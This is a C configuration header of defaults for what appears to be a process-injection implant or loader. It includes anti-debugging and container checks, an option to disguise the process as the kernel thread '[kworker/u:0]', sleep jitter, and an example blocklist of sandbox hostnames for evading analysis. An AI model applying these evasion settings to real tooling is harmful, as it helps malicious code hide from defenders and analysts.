#pragma once

/* All CONFIG_* macros have defaults here.
 * The Makefile (and builder.py via make vars) override them at compile time. */

#ifndef CONFIG_INJECTION_TYPE
#define CONFIG_INJECTION_TYPE 1
#endif

#ifndef CONFIG_GUARDRAILS_ENABLED
#define CONFIG_GUARDRAILS_ENABLED 0
#endif

#ifndef CONFIG_CHECK_PTRACE
#define CONFIG_CHECK_PTRACE 1
#endif

#ifndef CONFIG_CHECK_CGROUP
#define CONFIG_CHECK_CGROUP 1
#endif

#ifndef CONFIG_MASQUERADE_ENABLED
#define CONFIG_MASQUERADE_ENABLED 0
#endif

#ifndef CONFIG_MASQUERADE_NAME
#define CONFIG_MASQUERADE_NAME "[kworker/u:0]"
#endif

#ifndef CONFIG_SLEEP_MS
#define CONFIG_SLEEP_MS 0
#endif

#ifndef CONFIG_SLEEP_JITTER_MS
#define CONFIG_SLEEP_JITTER_MS 0
#endif

/* CONFIG_BLOCKED_HOSTNAMES and CONFIG_BLOCKED_USERNAMES are optional C-array
 * initialisers injected by the Makefile, e.g.:
 *   -DCONFIG_BLOCKED_HOSTNAMES='{"sandbox","malware","cuckoo"}'
 * They are only defined when the caller sets them. */
